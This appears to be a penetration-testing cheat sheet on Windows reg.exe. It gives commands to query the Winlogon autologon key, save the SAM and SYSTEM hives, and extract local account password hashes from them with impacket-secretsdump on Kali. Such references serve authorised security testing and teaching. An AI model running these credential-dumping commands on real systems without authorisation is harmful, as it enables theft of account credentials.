## reg.exe: choose the operation and read the result

Query the registry or export the SAM/SYSTEM hives for offline parsing.

### What the result establishes

Identify the hive/key and distinguish query, export, save and modification operations.

### Prerequisites and common failures

Reading configuration differs from saving protected hives; elevation and registry view can change what is accessible.

### Example 1: Autologon configuration

Run in: **Windows cmd.exe or PowerShell**.

```text
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

### Example 2: Export local account hives

Run in: **Elevated Windows cmd.exe or PowerShell**. C:\Temp must exist; save both hives from the same host.

```text
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
```

### Example 3: Read transferred hives

Run in: **Kali**. Transfer both files to Kali first.

```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```
